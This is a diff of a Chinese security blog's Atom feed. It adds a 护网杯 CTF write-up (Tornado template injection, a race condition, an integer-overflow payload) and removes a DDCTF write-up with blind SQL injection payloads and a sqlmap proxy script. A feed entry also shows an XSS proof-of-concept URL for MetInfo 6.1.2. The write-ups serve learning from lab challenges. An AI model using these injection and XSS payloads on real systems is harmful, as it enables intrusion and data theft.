@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://mang0.me/"/>
-  <updated>2018-10-15T18:27:47.044Z</updated>
+  <updated>2018-10-15T18:28:13.739Z</updated>
   <id>http://mang0.me/</id>
   
   <author>
@@ -21,7 +21,7 @@
     <link href="http://mang0.me/archives/a5c61176/"/>
     <id>http://mang0.me/archives/a5c61176/</id>
     <published>2018-10-15T18:16:08.000Z</published>
-    <updated>2018-10-15T18:27:47.044Z</updated>
+    <updated>2018-10-15T18:28:13.739Z</updated>
     
     <content type="html"><![CDATA[<h1 id="Xss-in-MetInfo-V6-1-2"><a href="#Xss-in-MetInfo-V6-1-2" class="headerlink" title="Xss in MetInfo V6.1.2"></a>Xss in MetInfo V6.1.2</h1><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>The vulnerability exists in the MetInfo6.1.2/admin/index.php page. Due to the lazy filtering of the parameter anyid, the XSS vulnerability is caused.</p><h2 id="Founction"><a href="#Founction" class="headerlink" title="Founction"></a>Founction</h2><p>The affected page located in admin’s management page:MetInfo6.1.2\admin\</p><h2 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h2><p>To build a website locally, first login to the website background: <a href="http://localhost/MetInfo6.1.2/admin/" target="_blank" rel="external">http://localhost/MetInfo6.1.2/admin/</a>. After the login is successful, construct the payload:</p><p>Xss vulnerability exists</p><pre><code>http://localhost:9096/MetInfo6.1.2/admin/index.php?lang=cn&amp;anyid=47oaflb%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3emwq3k&amp;n=admin&amp;c=admin_admin&amp;a=doadd</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201810160210_976.png" alt=""></p>]]></content>
     
@@ -38,6 +38,31 @@
     
     
       <category term="cve" scheme="http://mang0.me/tags/cve/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>护网杯</title>
+    <link href="http://mang0.me/archives/173905c2/"/>
+    <id>http://mang0.me/archives/173905c2/</id>
+    <published>2018-10-13T15:53:02.000Z</published>
+    <updated>2018-10-23T15:56:30.940Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy tornado"></a>easy tornado</h3><p>进入首页，看到文件列表。</p><p><a href="http://49.4.94.186:31331/" target="_blank" rel="external">http://49.4.94.186:31331/</a></p><p>随便点一个，可以读取文件内容，看到url里有两个参数，一个是文件名，另一个是签名。</p><p>根据 hint.txt ， 签名是 cookie_secret + 文件名 的 md5</p><pre><code>hint.txtmd5(cookie_secret + md5(filename))</code></pre><p><a href="http://49.4.94.186:31331/file?filename=Orz.txt&amp;signature=25d5cc7447f6e6a5785004b0a3362d6c" target="_blank" rel="external">http://49.4.94.186:31331/file?filename=Orz.txt&amp;signature=25d5cc7447f6e6a5785004b0a3362d6c</a></p><p>通过 FUZZ 参数，发现新的路由，即报错页面。</p><p><a href="http://49.4.94.186:31331/error?msg=%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF" target="_blank" rel="external">http://49.4.94.186:31331/error?msg=%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF</a></p><p>看到参数的 <code>签名错误</code> 被输出到页面里，应该是 SSTI。</p><p><img src="D:\my write markdown\data\02-CTF\2.0-writeup\xleEWng.png" alt=""></p><p>另外学习：</p><p><a href="http://blog.51cto.com/wengmengkai/1844886" target="_blank" rel="external">tornado—web框架基础入门</a> 通过这个进行快速学习tornado的开发</p><p><a href="http://www.tornadoweb.org/en/stable/" target="_blank" rel="external">tornado文档</a> 通过阅读文档快速掌握对象</p><p>安装:</p><pre><code>pip install tornado</code></pre><p>官方demo</p><pre><code class="python">import tornado.ioloopimport tornado.web# import uimodules as md# import uimethods as mtclass MainHandler(tornado.web.RequestHandler):    def get(self):        self.write(&quot;Hello, world&quot;)settings = {    &#39;template_path&#39;: &#39;views&#39;,        # html文件    &#39;static_path&#39;: &#39;statics&#39;,        # 静态文件（css,js,img）    &#39;static_url_prefix&#39;: &#39;/statics/&#39;,        # 静态文件前缀    &#39;cookie_secret&#39;: &#39;suoning&#39;,        # cookie自定义字符串加盐    # &#39;xsrf_cookies&#39;: True,         # 防止跨站伪造    # &#39;ui_methods&#39;: mt,           # 自定义UIMethod函数    # &#39;ui_modules&#39;: md,           # 自定义UIModule类}application = tornado.web.Application([    (r&quot;/&quot;, MainHandler),], **settings)if __name__ == &quot;__main__&quot;:    application.listen(8888)    tornado.ioloop.IOLoop.instance().start()</code></pre><p>通过<code>application = tornado.web.Application([(r&quot;/&quot;, MainHandler),], **settings)</code></p><p>很明显可以知道 cookie_secret 在RequestHandler这个对象里面</p><p>然后根据<a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="external">Tornado小记 – 模板中的Handler</a></p><blockquote><p>handler 指向RequestHandler</p><p>而RequestHandler.settings又指向self.application.settings</p><p>所有handler.settings就指向RequestHandler.application.settings了！</p></blockquote><p>就知道怎么通过模版注入 </p><p>模版注入绕过:<a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="external">Flask/Jinja2模板注入中的一些绕过姿势</a></p><p>里面的payload 基本都包含 () 很明显题目过滤了 只保留了. 所以通过上面别名的方法来获得cookie_secret</p><p>可以通过这个 msg= 直接读出 tornado 的配置。</p><p><img src="D:\my write markdown\data\02-CTF\2.0-writeup\jl6Wwoc.png" alt=""></p><p>找到了 cookie_secret，根据 hint，构造 url</p><p>/fllllllllllag</p><p>{BVt!-e%cqXs<a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#x26;&#x6c;&#110;&#x29;&#x24;&#x37;&#95;&#x78;&#73;&#x40;&#119;&#74;&#48;&#80;&#x41;&#x5e;&#x39;&#81;&#49;&#x23;&#x38;&#x3f;&#x6b;&#x68;&#x6a;&#40;&#x34;&#97;&#111;&#50;&#117;&#x72;&#x43;&#98;&#76;&#x33;&#x48;&#x45;&#126;&#46;&#71;&#x70;&#x7a;&#x46;&#x66;">&#x26;&#x6c;&#110;&#x29;&#x24;&#x37;&#95;&#x78;&#73;&#x40;&#119;&#74;&#48;&#80;&#x41;&#x5e;&#x39;&#81;&#49;&#x23;&#x38;&#x3f;&#x6b;&#x68;&#x6a;&#40;&#x34;&#97;&#111;&#50;&#117;&#x72;&#x43;&#98;&#76;&#x33;&#x48;&#x45;&#126;&#46;&#71;&#x70;&#x7a;&#x46;&#x66;</a>[YKSg</p><pre><code class="php">&lt;?php$str = &quot;/fllllllllllag&quot;;$a=md5($str);$str2 = &quot;{BVt!-e%cqXs&lt;&amp;ln)$7_xI@wJ0PA^9Q1#8?khj(4ao2urCbL3HE~.GpzFf&gt;[YKSg&quot;;$str3=$str2.$a;echo md5($str3);?&gt;</code></pre><p>2ad507bc2e8b59cce2e4147b0bfa169f</p><p><a href="http://49.4.94.186:31331/file?filename=/fllllllllllag&amp;signature=2ad507bc2e8b59cce2e4147b0bfa169f" target="_blank" rel="external">http://49.4.94.186:31331/file?filename=/fllllllllllag&amp;signature=2ad507bc2e8b59cce2e4147b0bfa169f</a></p><p>flag{fd29ee3314ce32fedce028ca753fb68a}</p><h3 id="LTSHOP"><a href="#LTSHOP" class="headerlink" title="LTSHOP"></a>LTSHOP</h3><p>本题的考点在于条件竞争以及整数的溢出问题</p><p>通过多线程发包的方式使得购买到 5 个以上的大辣条</p><p>可以使用burp抓包，发送到intruder</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201810181352_259.png" alt=""></p><p>设线程大一点</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201810181402_632.png" alt=""></p><p>start stack</p><p>得到10个大辣条越换两个辣条之王</p><p>抓包发现cookie有go_iris 猜测是go语言数据类型溢出</p><p>由于go使用强类型语言，猜测是整数溢出。 最后测试出是unsigned __int64,而uint64范围为18446744073709551615， 5个大辣条换一个辣条之王。</p><p>这里遇到了很大坑一开始我们一直用18446744073709551616，然后比赛完才发现要除以为除以5，所以最后num=3689348814741910324，那么要花费18446744073709551620个大辣条，超出uint64范围转换为5。</p><p>payload：</p><p>num=3689348814741910324</p><h3 id="easy-laravel"><a href="#easy-laravel" class="headerlink" title="easy_laravel"></a>easy_laravel</h3><p><a href="https://qvq.im/post/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%20easy_laravel%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95" target="_blank" rel="external">https://qvq.im/post/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%20easy_laravel%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95</a></p><p><a href="https://www.anquanke.com/post/id/161849" target="_blank" rel="external">https://www.anquanke.com/post/id/161849</a></p><p><code>ez_laravel</code>给了docker镜像，详细分析和复现下，确实是一道好题，膜4uuu师傅。</p><p><a href="https://github.com/sco4x0/huwangbei2018_easy_laravel" target="_blank" rel="external">https://github.com/sco4x0/huwangbei2018_easy_laravel</a></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="迟来的签到题"><a href="#迟来的签到题" class="headerlink" title="迟来的签到题"></a>迟来的签到题</h3><pre><code class="python">import base64tmp=&quot;&quot;string = &quot;AAoHAR1TJ1clUFYjVSRRV1cnIiUiV1BeUFNeIlBXI1BVI1UlUBs=&quot;string2 = base64.b64decode(string)print(string2)for i in range(1,256):    for j in string2:        tmp = tmp + chr(ord(j) ^ i)    print(tmp)    tmp=&quot;&quot;</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h2&gt;&lt;h3 id=&quot;easy-tornado&quot;&gt;&lt;a href=&quot;#easy-tornado&quot; class=&quot;headerlink&quot; titl
+      
+    
+    </summary>
+    
+      <category term="CTF" scheme="http://mang0.me/categories/CTF/"/>
+    
+    
+      <category term="ctf" scheme="http://mang0.me/tags/ctf/"/>
     
   </entry>
   
@@ -493,32 +518,6 @@
     
     
       <category term="文件上传" scheme="http://mang0.me/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>DDCTF三道小结</title>
-    <link href="http://mang0.me/archives/a7a61e20/"/>
-    <id>http://mang0.me/archives/a7a61e20/</id>
-    <published>2018-04-23T13:35:39.000Z</published>
-    <updated>2018-10-15T00:40:51.566Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="DDCTF三道小结"><a href="#DDCTF三道小结" class="headerlink" title="DDCTF三道小结"></a>DDCTF三道小结</h1><p>太菜了 就只能做出三道题，继续加油，明年再战</p><h2 id="╯°□°）╯︵-┻━┻"><a href="#╯°□°）╯︵-┻━┻" class="headerlink" title="(╯°□°）╯︵ ┻━┻"></a>(╯°□°）╯︵ ┻━┻</h2><p>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb7b9b8e4b5b5e4e2b7b6b5b5b2e1b9b2b2e4b0b0e4b7b7b5e5b3b3b1b1b9b0b7fd</p><p>进制转换，先将16进制转换为10进制，再对128求余，剩下的结果转换为字符。</p><pre><code class="python">ascii=&quot;212 232 225 244 160 247 225 243 160 230 225 243 244 161 160 212 232 229 160 230 236 225 231 160 233 243 186 160 196 196 195 212 198 251 185 178 178 225 226 185 185 183 180 225 180 183 227 228 179 178 178 227 230 180 179 226 181 176 182 177 176 230 225 229 225 181 253&quot;newlist=ascii.split()newlist2=ascii.split()for i in range(90,160):    for j in range(len(newlist)):        newlist2[j]=int(newlist[j])-i    for k in newlist2:        print chr(int(k)),    print &quot;&quot;</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201804192226_410.png" alt=""></p><p> DDCTF{922ab9974a47cd322cf43b50610faea5}</p><h2 id="第四扩展FS"><a href="#第四扩展FS" class="headerlink" title="第四扩展FS"></a>第四扩展FS</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201804192234_752.png" alt=""></p><p>分析得到有一个压缩包</p><p>foremost出来得到zip，</p><p>解压密码在windows.jpg属性的备注</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804192236_14.png" alt=""></p><p>Pactera</p><p>（插曲我一开始以为是crc32攻击）逃 </p><p>解压得到file</p><p>根据提示进行字符频度统计即可得到flag。</p><p><a href="http://www.aihanyu.org/cncorpus/CpsTongji.aspx" target="_blank" rel="external">http://www.aihanyu.org/cncorpus/CpsTongji.aspx</a></p><table><thead><tr><th>词</th><th>频次</th><th>频率 %</th><th></th></tr></thead><tbody><tr><td>1</td><td>D</td><td>3950</td><td>12.9381</td></tr><tr><td>2</td><td>C</td><td>1900</td><td>6.2234</td></tr><tr><td>3</td><td>T</td><td>1850</td><td>6.0596</td></tr><tr><td>4</td><td>F</td><td>1800</td><td>5.8958</td></tr><tr><td>5</td><td>{</td><td>1750</td><td>5.7321</td></tr><tr><td>6</td><td>t</td><td>1700</td><td>5.5683</td></tr><tr><td>7</td><td>u</td><td>1650</td><td>5.4045</td></tr><tr><td>8</td><td>0</td><td>1600</td><td>5.2407</td></tr><tr><td>9</td><td>k</td><td>1550</td><td>5.077</td></tr><tr><td>10</td><td>U</td><td>1500</td><td>4.9132</td></tr><tr><td>11</td><td>a</td><td>1450</td><td>4.7494</td></tr><tr><td>12</td><td>n</td><td>1400</td><td>4.5857</td></tr><tr><td>13</td><td>s</td><td>1350</td><td>4.4219</td></tr><tr><td>14</td><td>h</td><td>1300</td><td>4.2581</td></tr><tr><td>15</td><td>i</td><td>1250</td><td>4.0943</td></tr><tr><td>16</td><td>y</td><td>1200</td><td>3.9306</td></tr><tr><td>17</td><td>e</td><td>1150</td><td>3.7668</td></tr><tr><td>18</td><td>!</td><td>1100</td><td>3.603</td></tr><tr><td>19</td><td>}</td><td></td></tr></tbody></table><p>DDCTF{tu0kUanshiye!}</p><h2 id="Web-1-数据库的秘密"><a href="#Web-1-数据库的秘密" class="headerlink" title="Web 1 数据库的秘密"></a>Web 1 数据库的秘密</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201804212006_929.png" alt=""></p><p>使用插件modify headers加一个x-forward-for: 123.232.23.245</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804212005_33.png" alt=""></p><p>打开题目是三个搜索框和一个数据表格，分析form表单发现隐藏一处所以更改本地复现进行注入</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804220047_85.png" alt=""></p><p>发现是bool盲注，并用burp fuzz一下</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804220050_110.png" alt=""></p><p>发现union，database（）都被过滤</p><p>准语句：0’&amp;&amp;if(ascii(substr((select version()),1,1))&gt;0,1,0)#</p><p>得到库名：0’ &amp;&amp; if(ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1))&gt;0,1,0)#：DDCTF</p><p>得到表名0’&amp;&amp;if(ascii(substr((select table_name from information_schema.tables where table_schema=’ddctf’))&gt;0,1,0)#：ctf_key1</p><p>得到字段名 0’&amp;&amp;if(ascii(substr((select column_name from information_schema.columns where table_name=’ctf_key1’ limit 0,1),9,1))&gt;0,1,0)#：secvalue</p><p>得到flag  0’&amp;&amp;if(ascii(substr((select secvalue from ctf_key1 limit 0,1),1,1))&gt;0,1,0)#   ====0’ &amp;&amp; substr((select secvalue from ddctf.ctf_key1 limit 0,1),1,1)=’d’#</p><p>DDCTF{IKIDLHNZMKFUDEQE}</p><blockquote><p><strong>substr()函数</strong></p><pre><code>Substr()和substring()函数实现的功能是一样的，均为截取字符串。string substring(string, start, length)string substr(string, start, length)参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。</code></pre></blockquote><p>另附大佬一的奇特方法直接显注：</p><p>此waf为假waf 使用超过100个参数可以绕过</p><p><a href="http://www.hayasec.me/2018/04/20/ddctf-web1-writeup/" target="_blank" rel="external">http://www.hayasec.me/2018/04/20/ddctf-web1-writeup/</a></p><p>大佬二sqlmap一把梭：</p><p>对于此题，采用了使用 PHP 编写代理页面的方式，对请求进行了代理并签名。之后使用 sqlmap 等通用工具对该 PHP 页面进行注入即可。<br><code>proxy.php</code> 代码如下：</p><pre><code>&lt;?php@$id = $_REQUEST[&#39;id&#39;];@$title = $_REQUEST[&#39;title&#39;];@$author = $_REQUEST[&#39;author&#39;];@$date = $_REQUEST[&#39;date&#39;];$time = time();$sig = sha1(&#39;id=&#39;.$id.&#39;title=&#39;.$title.&#39;author=&#39;.$author.&#39;date=&#39;.$date.&#39;time=&#39;.$time.&#39;adrefkfweodfsdpiru&#39;);$ch = curl_init();$post = [    &#39;id&#39; =&gt; $id,    &#39;title&#39; =&gt; $title,    &#39;author&#39; =&gt; $author,    &#39;date&#39; =&gt; $date,];curl_setopt($ch, CURLOPT_URL,&quot;http://116.85.43.88:8080/KREKGJVFPYQKERQR/dfe3ia/index.php?sig=$sig&amp;time=$time&quot;);curl_setopt($ch, CURLOPT_HTTPHEADER, array(    &#39;X-Forwarded-For: 123.232.23.245&#39;,    ));curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, $post);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);curl_setopt($ch, CURLOPT_HEADER, true);$ch_out = curl_exec($ch);$ch_info = curl_getinfo($ch);$header = substr($ch_out, 0, $ch_info[&#39;header_size&#39;]);$body = substr($ch_out, $ch_info[&#39;header_size&#39;]);http_response_code($ch_info[&#39;http_code&#39;]);//header($header);//echo $header;echo $body;</code></pre><p>sqlmap 一把梭，对代理 PHP 页面进行注入，注入点果然位于 <code>author</code>，获得 flag。</p><blockquote><p><code>sqlmap.py -u &#39;http://127.0.0.1/proxy.php?author=admin&#39; --dump</code></p></blockquote><p><img src="https://clannad.me/image/web-1.png" alt="Web-1"></p><p><a href="https://clannad.me/ddctf.md.html" target="_blank" rel="external">https://clannad.me/ddctf.md.html</a></p><p><a href="http://sec2hack.com/ctf/ddctf-2018-web-writeup.html" target="_blank" rel="external">http://sec2hack.com/ctf/ddctf-2018-web-writeup.html</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;DDCTF三道小结&quot;&gt;&lt;a href=&quot;#DDCTF三道小结&quot; class=&quot;headerlink&quot; title=&quot;DDCTF三道小结&quot;&gt;&lt;/a&gt;DDCTF三道小结&lt;/h1&gt;&lt;p&gt;太菜了 就只能做出三道题，继续加油，明年再战&lt;/p&gt;
-&lt;h2 id=&quot;╯°□°）╯︵
-      
-    
-    </summary>
-    
-      <category term="CTF" scheme="http://mang0.me/categories/CTF/"/>
-    
-    
-      <category term="WP" scheme="http://mang0.me/tags/WP/"/>
     
   </entry>
   
